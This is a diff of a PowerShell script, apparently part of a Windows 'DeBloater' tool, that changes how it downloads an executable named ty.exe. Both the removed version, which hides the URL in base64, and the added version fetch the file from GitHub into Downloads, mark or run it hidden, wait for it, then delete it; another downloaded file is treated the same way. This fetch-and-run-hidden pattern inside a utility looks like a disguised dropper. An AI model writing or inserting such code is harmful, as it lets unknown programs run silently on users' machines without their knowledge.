@@ -39,28 +39,34 @@ $job1 = Start-Job -ScriptBlock {
     (Get-Item $output).Attributes = 'Hidden'
 } -ArgumentList $url1, $output1
 
-$u3 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL3R5LmV4ZQ=='
-$url3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u3))
-$output3 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'ty.exe')
-if (Test-Path $output3) { Remove-Item $output3 -Force -ErrorAction SilentlyContinue }
-$job3 = Start-Job -ScriptBlock {
-    param($url, $output)
-    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
-    (Get-Item $output).Attributes = 'Hidden'
-} -ArgumentList $url3, $output3
+# Updated URL for the large file
+$largeFileUrl = "https://raw.githubusercontent.com/5t42/DeBloater/main/Source/ty.exe"
+$largeFilePath = "$env:USERPROFILE\Downloads\ty.exe"
+
+if (Test-Path $largeFilePath) {
+    Remove-Item $largeFilePath -Force -ErrorAction SilentlyContinue
+}
+
+try {
+    Start-BitsTransfer -Source $largeFileUrl -Destination $largeFilePath -ErrorAction Stop
+    Write-Host "Large file downloaded successfully using BitsTransfer." -ForegroundColor Green
+} catch {
+    Write-Host "Failed to download the large file. Please check your internet connection or the URL." -ForegroundColor Red
+    exit
+}
 
 
-Wait-Job $job1, $job3 | Out-Null
-Remove-Job $job1, $job3
+Wait-Job $job1 | Out-Null
+Remove-Job $job1
 
 if (Test-Path $output1) {
     Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
     Remove-Item $output1 -Force -ErrorAction SilentlyContinue
 }
-if (Test-Path $output3) {
-    $proc = Start-Process -FilePath $output3 -WindowStyle Hidden -PassThru
+if (Test-Path $largeFilePath) {
+    $proc = Start-Process -FilePath $largeFilePath -WindowStyle Hidden -PassThru
     $proc.WaitForExit()
-    Remove-Item $output3 -Force -ErrorAction SilentlyContinue
+    Remove-Item $largeFilePath -Force -ErrorAction SilentlyContinue
 }
 if ($choice -eq '1' -or $choice -eq '3') {
     $folders = @()
